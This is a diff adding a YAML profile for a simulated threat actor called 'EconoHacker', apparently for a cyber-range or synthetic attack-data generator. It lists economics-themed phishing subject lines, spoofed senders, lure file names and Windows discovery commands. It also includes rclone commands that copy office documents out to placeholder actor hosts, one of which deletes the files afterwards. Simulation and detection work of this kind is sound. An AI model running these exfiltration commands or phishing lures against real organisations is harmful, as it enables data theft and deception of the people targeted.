@@ -1,0 +1,67 @@
+name: EconoHacker
+effectiveness: 70
+count_init_passive_dns: 8
+max_wave_size: 2
+attacks:
+  - recon:browsing
+  - email:phishing
+subjects:
+  - "Update on proposed trade policy"
+  - "Call for economic research papers"
+  - "Request for comments on new tax legislation"
+  - "Invitation to participate in economic summit"
+  - "Request for consultation on economic policy"
+  - "Call for industry survey responses"
+  - "Request for feedback on economic stimulus package"
+  - "Invitation to participate in economic forecasting project"
+  - "Request for market analysis report"
+  - "Call for input on economic impact of climate change"
+recon_search_terms:
+  - "economic policy proposals"
+  - "trade policy analysis"
+  - "tax legislation draft"
+  - "economic research funding"
+  - "industry survey questions"
+  - "economic stimulus spending"
+  - "market analysis templates"
+  - "climate change impact on economy"
+file_names:
+  - "budget_report_2022.xlsx"
+  - "financial_forecast_2022.pptx"
+  - "market_analysis_summary.docx"
+  - "tax_reform_proposals.docx"
+  - "trade_policy_recommendations.docx"
+  - "economic_impact_climate_change.pdf"
+tlds:
+  - com
+  - org
+spoofs_email: True
+malware:
+  - eco-disaster
+post_exploit_commands:
+  - name: cmd.exe
+    process: "cmd.exe dir /s"
+  - name: cmd.exe
+    process: "cmd.exe netstat -ano"
+  - name: cmd.exe
+    process: "cmd.exe ipconfig /all"
+  - name: cmd.exe
+    process: "cmd.exe systeminfo"
+  - name: cmd.exe
+    process: "cmd.exe tasklist"
+  - name: rclone.exe
+    process: "rclone.exe copy --transfers 2 --verbose --include '*.xlsx' --include '*.pptx' --include '*.docx' --include '*.pdf' . {actor_domain}"
+  - name: rclone.exe
+    process: "rclone.exe copy --transfers 2 --verbose --include '*.xlsx' --include '*.pptx' --include '*.docx' --include '*.pdf' --delete-after . {actor_ip}"
+domain_themes:
+  - economics
+  - finance
+  - policy
+  - market
+  - trade
+sender_themes:
+  - economist
+  - analyst
+  - researcher
+  - policy maker
+  - financial advisor
